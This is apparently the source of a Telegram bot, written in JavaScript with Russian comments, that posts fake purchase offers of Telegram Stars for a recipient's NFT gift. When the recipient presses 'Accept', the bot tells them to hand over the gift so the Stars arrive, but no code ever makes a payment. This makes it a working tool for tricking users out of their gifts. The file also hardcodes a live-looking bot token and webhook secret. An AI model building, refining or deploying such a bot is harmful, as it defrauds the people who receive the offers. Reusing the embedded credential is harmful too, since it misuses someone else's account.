const ADMIN_ID = 5151757168; 
const BOT_TOKEN = "9231998177:AAGBygPUUaRla7FJujix4bE9cpYWcg4U3w0"; // ВСТАВЬ СВОЙ ТОКЕН
const WEBHOOK_SECRET = "GarisOffer9231998"; // ВСТАВЬ СВОЙ СЕКРЕТ

const ALLOWED_IDS = [5151757168];
const ALLOWED_USERNAMES = ["nogannopervi"];

export default {
  async fetch(request, env, ctx) {
    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) {
      return new Response("Forbidden", { status: 403 });
    }

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;
        const username = update.message.from.username ? update.message.from.username.toLowerCase() : "";

        const isAdmin = userId === ADMIN_ID;
        const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));
        
        let text = "";
        if (!isAdmin && !isAllowed) {
          text = `🔒 <b>Доступ закрыт.</b>\n\nОбратитесь к владельцу.\nВаш ID: <code>${userId}</code>`;
        } else {
          text = `🎁 <b>NFT OFFER BOT</b> ||\n\n✅ <b>Пользователь · Gift</b>\n🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\nЧтобы отправить оффер, напишите:\n<code>@GarisOfferBot t.me/nft/LolPop-348029 450 stars</code>`;
        }
        await callApi("sendMessage", { chat_id: chatId, text: text, parse_mode: "HTML" });
      }

      // --- INLINE (Создание офера) ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        const username = iq.from.username ? iq.from.username.toLowerCase() : "";
        
        const isAdmin = userId === ADMIN_ID;
        const isAllowed = ALLOWED_IDS.includes(userId) || (username && ALLOWED_USERNAMES.includes(username));

        if (!isAdmin && !isAllowed) return new Response("OK", { status: 200 });

        const textQuery = iq.query.trim();
        const allNums = textQuery.match(/\d+/g); 
        const amount = allNums ? allNums[allNums.length - 1] : "0"; 
        
        const giftMatch = textQuery.match(/(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/); 
        const giftId = giftMatch ? giftMatch[0] : "";
        
        let giftLink = "";
        if (giftId) {
            if (giftId.startsWith("t.me")) {
                giftLink = "https://" + giftId;
            } else {
                giftLink = "https://t.me/nft/" + giftId;
            }
        }

        let senderName = iq.from.first_name || "";
        if (iq.from.last_name) senderName += " " + iq.from.last_name;
        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";

        const text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ⭐ Stars за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;

        const results = [{
          type: "article",
          id: "1",
          title: `Оффер от ${senderName}`,
          description: `За ${amount} ⭐ Stars`,
          input_message_content: { message_text: text, parse_mode: "HTML" },
          reply_markup: {
            inline_keyboard: [
              [{ text: "✅ Принять", callback_data: "acc" }],
              [{ text: "❌ Отклонить", callback_data: "dec" }]
            ]
          }
        }];

        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 });
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        
        // 1. МГНОВЕННО ОТВЕЧАЕМ (убираем загрузку и показываем окошко)
        if (cq.data === "acc") {
          await callApi("answerCallbackQuery", { 
            callback_query_id: cq.id, 
            text: "Предложение успешно принято ✅\n\nПередайте подарок, чтобы ⭐️ Stars пришли", 
            show_alert: true 
          });
        } else if (cq.data === "dec") {
          await callApi("answerCallbackQuery", { callback_query_id: cq.id });
        }

        if (!cq.message) return new Response("OK", { status: 200 }); 
        
        const chatId = cq.message.chat.id;
        const messageId = cq.message.message_id;
        const messageText = cq.message.text || cq.message.caption || "";

        const buyer = cq.from;
        let buyerName = buyer.first_name || "";
        if (buyer.last_name) buyerName += " " + buyer.last_name;
        if (!buyerName) buyerName = buyer.username ? "@" + buyer.username : "Пользователь";

        // Ссылка на профиль. Если нет @username, ведем на твой профиль (gwrex)
        let buyerLink = buyer.username ? "https://t.me/" + buyer.username : "https://t.me/gwrex";

        const amountMatch = messageText.match(/(\d+)\s*⭐/);
        const amount = amountMatch ? amountMatch[1] : "указанную сумму";

        let newText = "";
        let newMarkup = { inline_keyboard: [] };

        if (cq.data === "acc") {
          newText = `✅ <b>Подарок продан!</b>\n\nПередайте его покупателю <b>${buyerName}</b>, чтобы получить ${amount} ⭐️ Stars.`;
          newMarkup = { 
            inline_keyboard: [[{ text: "🎁 Передать подарок", url: buyerLink }]] 
          };
        } else if (cq.data === "dec") {
          newText = `❌ <b>Вы отказались от оффера.</b>`;
        }

        // 2. СНАЧАЛА ОТПРАВЛЯЕМ НОВОЕ СООБЩЕНИЕ
        try {
          await callApi("sendMessage", { 
            chat_id: chatId, 
            text: newText, 
            parse_mode: "HTML",
            reply_markup: newMarkup
          });

          // 3. ТОЛЬКО ПОТОМ УДАЛЯЕМ СТАРОЕ
          try {
            await callApi("deleteMessage", { chat_id: chatId, message_id: messageId });
          } catch (deleteError) {
            console.error("Не удалось удалить старое сообщение:", deleteError.message);
          }

        } catch (sendError) {
          console.error("Ошибка при отправке нового сообщения:", sendError.message);
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });
    const data = await response.json();
    if (!data.ok) {
      throw new Error(data.description);
    }
    return data;
  } catch (e) {
    console.error(`Ошибка API [${method}]:`, e.message);
    throw e;
  }
}